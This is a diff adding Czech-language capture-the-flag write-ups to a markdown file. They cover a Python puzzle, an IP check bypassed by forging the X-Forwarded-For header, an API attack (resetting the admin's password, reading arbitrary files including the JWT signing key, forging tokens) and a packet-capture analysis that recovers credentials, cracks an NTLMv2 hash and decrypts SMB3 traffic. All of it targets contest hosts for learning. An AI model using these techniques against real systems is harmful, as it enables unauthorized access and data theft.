@@ -960,3 +960,470 @@ CNS Josef verich, you can improve them by RkxBR3tsVHJHLTNvWG4tYW9aTi1aNHFNfQ== !
 Po base64 dekódování získáme finálně vlajku `FLAG{lTrG-3oXn-aoZN-Z4qM}`. Toto
 byla úloha, u které bylo od začátku jasné, co s ní dělat, a jsem rád, že jsem si
 díky ní zase po čase osvěžil práci s OpenCV.
+
+## Below deck troubles (získáno 16/16 bodů)
+
+### Cat code (3/3 body)
+
+> Ahoy, officer,
+>
+> due to the lack of developers on board, the development of the access code
+> generator for the satellite connection was entrusted to the cat of the chief
+> officer. Your task is to analyze the cat's creation and find out the code.
+>
+> May you have fair winds and following seas!
+>
+> Download the [cat code](https://owncloud.cesnet.cz/index.php/s/QqgJmk6FdCg3dis/download).
+
+Po stažení souboru se nám naskytne pohled na dva velice umňoukané kusy Pythoního
+kódu :D
+
+Hlavní spustitlený kód je [`meowmeow.py`](13_Cat_code/original/meowmeow.py),
+který využívá metody z ['meow.py](13_Cat_code/original/meow.py). Když se
+pokusíme kód spustit, tak se nás zeptá "Who rules the worlds?" a očekává
+odpověď.
+
+Krátký pohled do zdrojáku nám napoví, že jediná správná odpověď je `kittens`
+a pak se zavolá `meowmeow(meow(sum([ord(meow) for meow in meoword])))` kde
+`meoword` je `kittens`, takže je to vlastně ekvivalentní zavolání
+`meowmeow(meow(770))`. To byla ta jednodušší část.
+
+Když teď kód zkusíme spustit, tak se nám obrazovka zaplní nekonečně mňoukáním
+a budeme čekat věčně. Pojďme se tedy podívat do `meow.py`.
+
+Samotná funkce `meowmeow()` není to, co trvá dlouho. Ta jen dostane velké číslo,
+převede ho na string a pak do něj indexuje pomocí velkého listu čísel, aby
+sestavila jiná čísla, která pak finálně prožene skrze `chr` na písmenka.
+Zamotané, ale tohle dlouho netrvá.
+
+To co ale trvá dlouho je `meow()`, ta totiž počítá
+[Fibonacciho číslo](https://cs.wikipedia.org/wiki/Fibonacciho_posloupnost) a to
+rekurzivně podle definice, což je exponencionální v době výpočtu (a taky vede
+k exponencionálně mnoha zamňoukáním do terminálu :D). To ale můžeme lehce
+opravit pomocí [dynamického programování](https://ksp.mff.cuni.cz/kucharky/dynamicke-programovani/) aneb nepočítat stejné věci vícekrát, ale uložit si je.
+V Pythonu to můžeme lehce zařídit pomocí dekorátorů:
+
+```python
+def memoize(f):
+    memo = {}
+    def helper(x):
+        if x not in memo:
+            memo[x] = f(x)
+        return memo[x]
+    return helper
+
+@memoize
+def meow(kittens_of_the_world):
+    ...
+```
+
+Druhá věc, ktrou potřebujeme udělat, je zvětšit povolenou hloubku rekurze a to
+třeba takto:
+
+```python
+import sys
+sys.setrecursionlimit(2000)
+```
+
+Upravené soubory: [`meow.py`](13_Cat_code/meow.py), [`meowmwow.py`](13_Cat_code/meowmeow.py)
+
+Pak po spuštění již dostaneme docela málo zamňoukání a pak také text
+`FLAG{YcbS-IAbQ-KHRE-BTNR}`. A jen jako zpestření, 770. Fibonacciho číslo, které
+se předává do `meowmeow()` vypadá takto:
+
+```
+37238998302736542981557591720664221323221262823569669806574084338006722578252257702859727311771517744632859284311258604707327062313057129673010063900204812137985
+```
+
+### Component replacement (3/3 body)
+
+> Ahoy, officer,
+>
+> the ship had to lower its speed because of broken `fuel efficiency enhancer`.
+> To order a correct spare part, the chief engineer needs to know exact
+> identification code of the spare part. However, he cannot access the web page
+> listing all the key components in use. Maybe the problem has to do with
+> recently readdressing of the computers in the engine room - the old address
+> plan for whole ship was based on range `192.168.96.0/20`. Your task is to find
+> out the identification code of the broken component.
+>
+> May you have fair winds and following seas!
+>
+> The webpage with spare parts listing is available at <http://key-parts-list.cns-jv.tcc>.
+
+Když si otevřeme zmíněnou stránku, tak nám vypíše "You are attempting to access
+from the IP address 10.200.0.60, which is not assigned to engine room. Access denied."
+
+Když se podíváme na hlavičky, tak poznáme, že stránka je napsaná v PHP a běží
+pod Apachem:
+
+```sh
+$ curl -v "http://key-parts-list.cns-jv.tcc/"
+[…]
+< Server: Apache/2.4.56 (Debian)
+< X-Powered-By: PHP/8.0.30
+[…]
+```
+
+Kontrolu IP adresy dělá velmi pravděpodobně právě PHP, do toho se musí IP adresa
+nějak dostat (podobně jako do čehokoliv dalšího běžícího za nějakou proxy).
+Běžně se na to používá HTTP hlavičky [`X-Forwarded-For`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)
+a `X-Real-Ip`, zkusme nějakou z nich nastavit:
+
+```sh
+$ curl -H "X-Forwarded-For: 1.2.3.4" http://key-parts-list.cns-jv.tcc
+You are attempting to access from the IP address 1.2.3.4, which is not assigned to engine room. Access denied.
+```
+
+Teď jen potřebujeme uhádnout adresu strojovny. Naštěstí v prefixu `/20` není
+adres zase tak mnoho (je jich 4096). Na vylistování adres můžeme zneužít třeba
+známý `nmap`, jehož výstup trochu ořízneme pomocí `awk` a pak na každou adresu
+spustíme `curl`:
+
+```sh
+nmap -sL -n 192.168.96.0/20 | awk '/Nmap scan report/{print $NF}' | while read ip; do
+    echo $ip
+    curl -s -H "X-Forwarded-For: $ip" "http://key-parts-list.cns-jv.tcc/" | grep -v "Access denied"
+done
+```
+
+Po chvíli zkoušení adres zjistíme, že web povoluje adresy z rozsahu
+`192.168.100.32` až `192.168.100.63`. V seznamu najdeme `Fuel efficiency enhancer`
+a flag `FLAG{MN9o-V8Py-mSZV-JkRz}`.
+
+### U.S.A. (5/5 body)
+
+> Ahoy, officer,
+>
+> on our last port visit, a new U.S.A. (Universal Ship API) interface was
+> installed on the ship. In order to unlock new experimental ship functions, the
+> special code has to be entered into ship FLAG (First Layer Application
+> Gateway). Your task is to get this FLAG code from U.S.A.
+>
+> May you have fair winds and following seas!
+>
+> The U.S.A. is available at <http://universal-ship-api.cns-jv.tcc>.
+
+Jak už je u pokročilejších úloh zvykem, tak první nažhavíme `nmap`, který nám
+ale poví, že je na celém serveru povolený jediný port:
+
+```
+PORT   STATE SERVICE
+80/tcp open  http
+```
+
+Je na něm API, dá se uhádnout [`/api/`](http://universal-ship-api.cns-jv.tcc/api)
+a pak s nápovědou z vráceného JSONu zkoušet. Najdeme endpointy:
+
+* [`/api/v1`](http://universal-ship-api.cns-jv.tcc/api/v1) – rozcestník na `admin` a `user`
+* [`/api/v1/admin`](http://universal-ship-api.cns-jv.tcc/api/v1/admin/) – podle hlaviček chce `Bearer` token
+* pod `/api/v1/user/` asi něco je, ale neumíme to uhádnout
+
+Pak se dá uhádnout `/docs` a `openapi.json`, ale chtějí autorizaci. Asi zde ale
+bude ještě několik dalších endpointů. Zkusíme použít [kiterunner](https://github.com/assetnote/kiterunner)
+na uhádnutí běžných enpointů a metod, které podporují:
+
+```sh
+$ kr scan --fail-status-codes 401 -w routes-large.kite http://universal-ship-api.cns-jv.tcc/api/v1
+POST    400 [     43,    4,   1] http://universal-ship-api.cns-jv.tcc/api/v1/user/login 0cf685c14b645f9505187d0e64e45c6a688aa513
+$ kr scan --fail-status-codes 401 -w routes-large.kite http://universal-ship-api.cns-jv.tcc/api/v1/user
+POST    422 [     88,    6,   1] http://universal-ship-api.cns-jv.tcc/api/v1/user/signup 0cf68c053155400dab3dc59b0ef53def2f7ef09f
+$
+```
+
+Objevili jsme zajímavé endpointy `POST /api/v1/user/login` a `POST /api/v1/user/signup`.
+První z nich chce `application/x-www-form-urlencoded` POST a když mu posíláme
+requesty, napoví nám, že potřebuje `username` a `password`:
+
+```sh
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/login"
+{"detail":[{"loc":["body","username"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/login" -d 'username=admin&password=pass'; echo
+{"detail":"Incorrect username or password"}
+```
+
+Druhý z nich `POST /api/v1/user/signup` chce JSON. Po chvíli pokusů a napovídání
+od API se nám nakonec povede registrovat:
+
+```sh
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup"
+{"detail":[{"loc":["body"],"msg":"field required","type":"value_error.missing"}]}
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup" -d 'a'
+{"detail":[{"loc":["body"],"msg":"value is not a valid dict","type":"type_error.dict"}]}
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup" -H "Content-Type: application/json" -d '{}'
+{"detail":[{"loc":["body","email"],"msg":"field required","type":"value_error.missing"},{"loc":["body","password"],"msg":"field required","type":"value_error.missing"}]}
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/signup" -H "Content-Type: application/json" -d '{"email": "setnicka@seznam.cz", "password": "123456"}'
+--> 201 Created
+```
+
+Přihlásíme se a dostaneme access token:
+
+```sh
+$ curl -X POST -v "http://universal-ship-api.cns-jv.tcc/api/v1/user/login" -d 'username=setnicka@seznam.cz&password=123456'
+{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzMyMzEyLCJpYXQiOjE2OTcwNDExMTIsInN1YiI6IjIiLCJhZG1pbiI6ZmFsc2UsImd1aWQiOiI1MTc0YzExNi1mZDU1LTQ5MzQtOTI4Mi01NTc3MzlkM2ZlZmMifQ.qiW3fNQzcAtBRBkvv86_V2wf1GrP8ZIsSXSBjOU9axEu3kK7ik8ts7D7YhD8TcSN8ga0x5nhQsqtHll5uYts8hPQWzCVg7CiB8omztUID_CNgX4PbwhFJl50NI3hV_hKzTGZFBdIwKaGBqfHdHub7VZtnrMbBwEpU2hrRD_zRiXbQPdmjfdmubHvSBGIzwCiCyplNeOrXlZtd_eza7LKuFygSZZFTvI0LmjCvaxb70q8H98rm-E1CjLIUA5xlgabsUyRrKybu1D64_gG1o7QdAE9YQ5T75ozTbPhiE4ZxhZONFe-IoL_pMaecqWyrnNl53FFUDD1vxk_GAS-_kgWhk9PkO194UuHc-QuwVQ7eGFwudXL5qCW5Hy4MqYpWCHOQ07MZs-P6NjPmf_G-suY243QN-EG8zTbtM6hUc7b1AzSsqzAIBwh48dUF0zg6RUYp-MO3ySg_qymBMZy20mNZFuVTReZ7QhkOpYgio2BlObUy6ZO732sFeL8_WUShsS7DZmvJWkpRnSur8v5VWZNDfITynTco4JhCzfrtHoemRYcMmHR1g5ZXTgQIluKk_dgqlS4RBrhhmTFzAPO6pmzXIb_B_vcOancFzSbkWDohOejOGT1x-CA6mwavSlrFBqaS_vpKS0zYZX5PeVB7b1bcyL1GOsNr5rIfBEBrO3-aFU","token_type":"bearer"}
+```
+
+Z tokenu lze dekódovat JWT token (první část před tečkou, pak je podpis):
+```json
+{
+ alg: "RS384",
+ typ: "JWT"
+}.
+{
+ type: "access_token",
+ exp: 1697732312,
+ iat: 1697041112,
+ sub: "2",
+ admin: false,
+ guid: "5174c116-fd55-4934-9282-557739d3fefc"
+}.
+[signature]
+```
+
+S tokenem se můžeme vydat po systému. Do `/api/v1/admin` se stále nedostaneme
+(na to nemáme v tokenu nahozené políčko `admin`), ale můžeme získat OpenAPI
+dokumentaci:
+
+```sh
+$ curl -v -H "Authorization: Bearer …" "http://universal-ship-api.cns-jv.tcc/openapi.json" > openapi.json
+```
+
+Dokumentace: [`openapi.json`](17_USA/openapi.json)
+
+Všimneme si zajímavých endpointů:
+* `PUT /api/v1/admin/getFlag` – sem nás to nepustí
+* `POST /api/v1/admin/file` – sem nás to taky nepustí
+* `POST /api/v1/user/updatepassword` – umožní nám nastavit nový `password`, ale `admin` field nezmění
+* `GET /api/v1/user/{user-id}`
+
+My jsme user id=2, kdo je user id=1?
+```json
+{"guid":"b801175a-a949-4137-ae1f-7c05a2c4bfde","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}
+```
+
+Jde mu změnit heslo? ANO! :D
+
+```sh
+$ curl -X POST -v -H "Authorization: Bearer $token" "http://universal-ship-api.cns-jv.tcc/api/v1/user/updatepassword" -H "Content-Type: application/json" -d '{"guid": "b801175a-a949-4137-ae1f-7c05a2c4bfde", "password": "aiwohc7O"}'
+{"guid":"b801175a-a949-4137-ae1f-7c05a2c4bfde","email":"admin@local.tcc","date":null,"time_created":1690796892351,"admin":true,"id":1}
+```
+
+Přihlásíme se a jdeme pro vlajku:
+```sh
+$ curl -X POST "http://universal-ship-api.cns-jv.tcc/api/v1/user/login" -d 'username=admin@local.tcc&password=aiwohc7O'; echo
+{"access_token":"eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzMzOTMzLCJpYXQiOjE2OTcwNDI3MzMsInN1YiI6IjEiLCJhZG1pbiI6dHJ1ZSwiZ3VpZCI6ImI4MDExNzVhLWE5NDktNDEzNy1hZTFmLTdjMDVhMmM0YmZkZSJ9.XoIlOQIquvmnkBRCY4ZKriBXXv3SUKur1XAyWYJ8Z9XC-_mBEwIpN4EFd0qhAy9DRf5iyhg72xrMTyONjorA0Dom8EQ_udOhkFalYqOhGtHAZxNTdLnheirteJCUJ4Icmsv-YOi768YlFG1CdTgV1mO8QkKJwQ2k-UDezg6OGui780p_z3VL5Ar8wpIMejexEqsagoQ327qnQ5I-l52cagMg3MpC-XU1sysRJsnifKN1KqZHFpElzXt0SLYuMSbnX78Z7SlX8AwJvUixK9OzmYXhvHECbR7rHGMGMB8LpxwUG1maZSEdaQxbgOuYRpUarGZ2se2Q-3aORWrHjIjh1enIgKqIFdbZABFP1RwoSJTRxTHRPcRqwPEmSUb4XTqWvQXJep__L4Sb2fbTs7ev0RB_ht2tLPFpIt-SVAAkprF6yF19XUdA_6Rsq2CQKEtZhzsqOBYxVOsRcY7S-JMaq-ze_Gv8CEjZYNImOd_257xdvNJ7WOAR72IrfYOhykMaZyLwVZW1sk9R-YDrrZu7hW8Oi0_Bk4f0Ko42ETJ87nl9nvP6GMEGrj6tPbYPi4-wA9MMKKRF9M0L2FllK-cQK00lpCuSuK7Qa_Pa9AUSOvVMKG9_qSP5eCnZT2kgUFYvaloSd630dAa8xlDWFgYY_xuMaHmPy8-6eMqerZzCNs0","token_type":"bearer"}
+
+$ curl -X PUT -v -H "Authorization: Bearer $admin_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag"
+{"detail":"flag-read key missing from JWT"}
+```
+
+Tak jednoduché to bohužel není :( Musíme tedy prozkoumat i `/api/v1/admin/file` endpoint. A ten je překvapivě mocný:
+
+```sh
+curl -X POST -v -H "Authorization: Bearer $admin_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/file" -H "Content-Type: application/json" -d '{"file": "/etc/passwd"}'
+-> vrátí /etc/passwd
+```
+
+Neumožní nám ale vylistovat složku, musíme tedy zjistit názvy souborů. Postupně
+zkoumáme filesystém okolo sebe:
+* Dotazem na `../etc/passwd` zjistíme, že běžíme v 1 podsložce
+* `__init__.py` je prázdný soubor ale existuje
+* `../app/__init__.py` je asi ten stejný soubor
+* `/proc/self/environ` nám vrátí nastavení environmentu pro aktuální proces:
+
+```ini
+HOSTNAME=c3084a02d5ed
+PYTHON_VERSION=3.10.13
+APP_MODULE=shipapi.main:app
+PWD=/app
+PORT=80
+PYTHON_SETUPTOOLS_VERSION=65.5.1
+TZ=Europe/Prague
+HOME=/home/appuser
+LANG=C.UTF-8
+VIRTUAL_ENV=/app/venv
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+PYTHONPATH=.
+HOST=0.0.0.0
+SHLVL=0
+PYTHON_PIP_VERSION=23.0.1
+VIRTUAL_ENV_PROMPT=(venv)
+PYTHON_GET_PIP_SHA256=45a2bb8bf2bb5eff16fdd00faef6f29731831c7c59bd9fc2bf1f3bed511ff1fe
+PS1=(venv)
+PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/9af82b715db434abb94a0a6f3569f43e72157346/public/get-pip.py
+PATH=/app/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+Zajímavá proměnná je `APP_MODULE=shipapi.main:app`. Podíváme se na cestu `shipapi/main.py`:
+
+```sh
+$ curl -s -X POST -H "Authorization: Bearer $admin_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/file" -H "Content-Type: application/json" -d '{"file": "shipapi/main.py"}' | jq -r '.file' > shipapi/main.py
+```
+
+Postupně postahujeme (a z nich odhadneme přes importy další jména) velkou část
+aplikace (viz její [složka](17_USA/shipapi/)). A to včetně klíčů používaných pro
+podepsání JWT tokenu:
+
+* [`shipapi/main.js`](17_USA/shipapi/main.js)
+* [`shipapi/appconfig/config.py`](17_USA/shipapi/appconfig/config.py)
+* [`shipapi/appconfig/jwtsigning.key`](17_USA/shipapi/appconfig/jwtsigning.key)
+* [`shipapi/appconfig/jwtsigning.pub`](17_USA/shipapi/appconfig/jwtsigning.pub)
+
+Pro analýzu JWT tokenů existuje krásná stránka [jwt.io](https://jwt.io/), kde
+vložíme náš současný token, vložíme klíče a můžeme modifikovat JSON payload
+a vyrábět nové tokeny. Přidáme si tam klíč `"flag-read": true,` a dostaneme:
+
+```sh
+flag_token=eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjk3NzMzOTMzLCJpYXQiOjE2OTcwNDI3MzMsInN1YiI6IjEiLCJmbGFnLXJlYWQiOnRydWUsImFkbWluIjp0cnVlLCJndWlkIjoiYjgwMTE3NWEtYTk0OS00MTM3LWFlMWYtN2MwNWEyYzRiZmRlIn0.Cy51CY0s-Z1St3jLHk7kEpHfSOmyVYjeWczNupwIqKwwgo9ggNH8x9_8HdotL4Zm19rTM7jo1eOPxpf63hvYAqGYmvQdwblqPG6NJTyzh-IF8lC5Yp65QZJIJpHdy-djRw_O3Q2W_fwvi7ANUocsNIgvmtTRD3li4IS4P8BS9stGukgpnxkStMenvf_aOohvcsMYPNR9Ak-F6CixsjXwFjOxvbjnUM7vsRDzBbSIuoupy-9d1TzFz7wgx-c9R3LqdtmmKvoj4NmF5pxKdrXVPrEl2zvxptLDWBU_cTD3pgJVA7shRkAPIAi0TV_SzbqDb5_ihEs3B8WXdv2NX6Kzt3qh73Mbklk11gkRsgKhDRqkv8ZBzRwOYFp4wuQIjfn83Y8AYtPjba_SUazUJACcp1_gokEaFcsqumU9pmDY53YVP4gkpOmxTizvUTsfemTwC8HalHM2JYAhIVLIQhSwxXHiDdQVNDusz_jKjOS8e8pSYCh-hepKJihpg-wwfOl4cnsnCohwRazuhDNOs3nXmQ5E9p1_tHX1N3xokzcj0tbqOUSNSLLM2APzlgsMQMVDVA28L7peCWC3ZcUxajTMZwz6O7CkJArQ-MPnfSy7KFU7-ht56lJzXY9bnwNLq4AGt8FSp_ypaP85I6tM_Rkox7jHN4Z9XardwClGFRACgfc
+
+$ curl -X PUT -v -H "Authorization: Bearer $flag_token" "http://universal-ship-api.cns-jv.tcc/api/v1/admin/getFlag"
+{"Flag":"FLAG{910P-iUeJ-Wwq1-i8L2}"}
+```
+
+Toto byla hezká úloha, jediný zádrhel mohl být v hádání názvů endpointů a pak
+názvů souborů na disku. Ale na obojí byly způsoby, jak se přes to dostat.
+
+### Suspicious traffic (5/5 bodů)
+
+> Ahoy, officer,
+>
+> the chief security officer has told you, he came across a very suspicious
+> event in ship's security logs on the occasion of a planned monthly log check.
+> The event is related to accessing the secret file secret.db on server on cargo
+> deck. Luckily, the ship is equipped with an automatic network traffic
+> recorder, which was activated by the suspicious event and provided
+> corresponding packet capture. Your task is to confirm that the mentioned file
+> has been exfiltrated and to examine its contents.
+>
+> May you have fair winds and following seas!
+>
+> Download the [pcap](https://owncloud.cesnet.cz/index.php/s/GrNNG2i6GifsWdn/download).
+
+Toto byla úloha, která se mi z celého letošního The Catch líbila nejvíce. Krásně
+samonosná v tom, že všechno, co člověk potřebuje, je ukryté uvnitř jednoho
+pcap souboru :)
+
+Pojďme se ale do staženého pcapu pomocí [Wiresharku](https://www.wireshark.org/)
+podívat. Prostým koukáním nalezneme několik zajímavých věcí, rozeberme si je po
+protokolech:
+
+DNS:
+* Můžeme zjistit IP některých strojů v síti:
+  * smbserver1 -> 172.20.0.2
+  * smbserver2 -> 172.20.0.6
+  * webserver -> 172.20.0.3
+* Hodně DNS dotazů na `_kerberos._udp.LOCAL.TCC`, `_kerberos._tcp.LOCAL.TCC`,
+  `_kerberos._http.LOCAL.TCC` a taky `kerberos.LOCAL.TCC` s odpověďmi "no such server"
+
+HTTP:
+* Ke konci pcapu je pár HTTP requestů na 172.20.0.3 na `/admin` endpoint
+  s HTTP basic autorizací `admin:james.f0r.HTTP.4648507`
+
+SMB:
+* Je zde několik nešifrovaných spojení
+  * Dá se z nich vytáhnout soubor [`history.db`](18_Suspicious_traffic/history.db)
+    a [`employees.db`](18_Suspicious_traffic/employees.db), Wireshark umí soubory
+    přímo uložit
+  * Oba soubory jsou poslané několikrát, ale podle md5sum jsou všechyn verze stejné
+  * Oba soubory jsou SQLite databáze
+* Je tam SMB3 encrypted komunikace – do té se neumíme bez hesla dostat
+  * Vykoukáme z toho jen, že ji inicioval `james_admin`
+
+FTP:
+* Vidíme heslo v plaintextu `james.f0r.FTP.3618995`
+* Používá se PORT command = druhá strana si requestne soubor z daného portu, což
+  trochu mate Wireshark – je potřeba označit komunikaci z daného portu taky za
+  FTP, tak už ji Wireshark zobrazí správně
+* Jde vytáhnout [`home.tgz`](18_Suspicious_traffic/home.tgz) a rozbalit, je to
+  home nějakého uživatele
+  * Když projdeme `.bash_history`, tak objevíme command s heslem
+    ```sh
+    openssl enc -aes-256-cbc -salt -pbkdf2 -in secret.db -out secret.db.enc -k R3alyStr0ngP4ss!
+    ```
+  * Takže teď už jenom získat secret.db.enc, v `home.tgz` bohužel není
+* Jde najít i [`etc.tgz`](18_Suspicious_traffic/etc.tgz)
+  * Dost souborů bylo změněno 8. září, ale není v nich nic zajímavého (žádná hesla k SMB)
+
+Když z toho uděláme nějaký závěr, tak na síti hodně komunikoval nějaký `james`,
+který používá docela pravidelný pattern pro hesla: `james.f0r.<služba>.<číslo>`.
+Povedlo se nám dekódovat a nějak přečíst skoro vše, co na síti proběhlo, vyjma
+té jedné šifrované SMF komunikace iniciované uživatelem `james_admin`.
+
+#### Dešifrování SMB komunikace
+
+Vydal jsem se zkoumat, jak se dá zpětně dešifrovat SMB komunikace a náhodou jsem
+našel skvělý popis v článku [Decrypting SMB3 Traffic with just a PCAP? Absolutely (maybe.)](https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2),
+díky kterému jsem zjistil, že Wireshark mi komunikaci umí dešifrovat, pokud
+dostane *session key* pro danou komunikaci. A *session key* se dá spočítat
+z toho, co si protistrany vyměnily při úvodním handshake a z hesla, to je dobrá
+zpráva (není zde žádný [Diffie-Hellman](https://cs.wikipedia.org/wiki/Diffieho%E2%80%93Hellmanova_v%C3%BDm%C4%9Bna_kl%C3%AD%C4%8D%C5%AF)
+ani nic podobného).
+
+Navazování komunikace probíhá v kostce takto:
+* Klient a server navážou TCP spojení a vymění si, co kdo umí
+* Server pošle `NTLM server challenge`
+* Klient odpovíd pošle:
+  * username
+  * doménu
+  * `NTProofStr` a zbytek `NTLMv2 response`
+  * zakódovaný session key
+
+Podle výše zmíněného článku jsem si pořídil skript [`compute_samba_session_key.py`](18_Suspicious_traffic/compute_samba_session_key.py)
+na výpočet session key k dešifrování komunikace. Skript potřebuje:
+
+* `user`– uživatelské jméno, v našem případě vyčteme z komunikace `james_admin`
+* `domain` – doménové jméno, opět vyčteme z komunikace `LOCAL.TCC`
+* `password` – heslo uživatele, **to neznáme**
+* `ntproofstr` – lze vyčíst z komunikace (`8bc34ae8e76fe9b8417a966c2f632eb4`)
+* `key` — zakódovaný session key, lze vyčíst z komunikace (`4292dac3c7a0510f8b26c969e1ef0db9`)
+
+#### Crackování NTLM hesla
+
+Jediné, co nám schází, je heslo. Můžeme odhadnout, že bude mít klasický tvar
+`james.f0r.SMB.<číslo>` nebo `james_admin.f0r.SMB.<číslo>`.
+
+Pak prozkoumáme článek o [crackování NTLMv2 hashe na 801 Labs](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
+a podle něj použijeme [`hashcat`](https://hashcat.net/hashcat/), což je utilita
+na velmi rychlé crakování hesla. Hesla může zkoušet úplně náhodně, ale při naší
+odhadované délce hesla to je již příliš. Můžeme si ale pořídit generátor na
+odhadnutý tvar hesla (viz [`gen_passwordlist.py`](18_Suspicious_traffic/gen_passwordlist.py))
+a pak nechat `hashcat` hesla velmi rychle vyzkoušet.
+
+Z komunikace vytáhneme tato data:
+
+```
+Username: james_admin
+Domain: LOCAL.TCC
+NTLM server challenge: 78c8f4fdf5927e58
+NTProofStr: 8bc34ae8e76fe9b8417a966c2f632eb4
+NTLMv2 response (without NtProofStr): 01010000000000003ab4fc1550e2d901b352a9763bdec89a00000000020018004100360037004600320042004100340045003800460032000100180041003600370046003200420041003400450038004600320004000200000003001800610036003700660032006200610034006500380066003200070008003ab4fc1550e2d901060004000200000008003000300000000000000000000000000000002581558b8f3cf059f3661e7cb3af60d9b63a7561b7f48607589fb37e551862b10a0010000000000000000000000000000000000009001e0063006900660073002f0073006d006200730065007200760065007200320000000000
+```
+
+Z nich pro `hashcat` vytvoříme soubor [`crackme.txt`](18_Suspicious_traffic/crackme.txt)
+ve správném formátu a pak spustíme (`-m 5600` je typ pro NTLM hesla).
+
+```sh
+$ ./gen_passwordlist.py | hashcat -m 5600 crackme.txt`
+# -> Crackneme `james_admin.f0r.SMB.8089078`
+```
+
+Máme heslo! Spustíme připravený skript a získáme random session key:
+
+```sh
+$ ./compute_samba_session_key.py -v --user james_admin --domain LOCAL.TCC --password "james_admin.f0r.SMB.8089078" --ntproofstr "8bc34ae8e76fe9b8417a966c2f632eb4" --key "4292dac3c7a0510f8b26c969e1ef0db9"
+PASS HASH: 7cf87b641c657bf9e3f75d93308e6db3
+RESP NT:   a154f31a5ecc711694c3e0d064bac78e
+NT PROOF:  8bc34ae8e76fe9b8417a966c2f632eb4
+KeyExKey:  6a1d3b41cdf3d40f15a6c15b80d567d0
+Random SK: 7a93dee25de4c2141657e7037dddb8f1
+```
+
+Vložíme `7a93dee25de4c2141657e7037dddb8f1` do Wiresharku pro ID komunikace `49b136b900000000` a voilá… Decrypted!
+Uložíme si z komunikace [`secret.db.enc`](18_Suspicious_traffic/secret.db.enc)
+a pak ji dekódujeme:
+
+```sh
+openssl enc -d -aes-256-cbc -pbkdf2 -in secret.db.enc -out secret.db -k R3alyStr0ngP4ss!
+```
+
+V SQLite databázi najdeme `FLAG{5B9B-lwPy-OfRS-4uEN}`. Velmi pěkná úloha, děkuji autorům :)
